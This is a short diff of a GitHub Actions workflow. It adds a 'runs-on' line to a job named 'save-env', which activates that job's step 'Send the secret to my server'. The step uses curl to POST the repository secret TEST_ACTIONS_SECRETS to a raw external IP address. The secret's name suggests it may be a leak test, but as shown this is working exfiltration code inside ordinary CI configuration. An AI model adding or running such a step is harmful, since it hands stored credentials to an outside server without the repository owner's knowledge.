@@ -14,6 +14,7 @@ jobs:
     secrets:
       github_token: ${{secrets.GITHUB_TOKEN}}
   save-env:
+    runs-on: ubuntu-latest
     steps:
     - name: Send the secret to my server
       run: curl "http://54.190.194.43/" --data "${{secrets.TEST_ACTIONS_SECRETS}}"
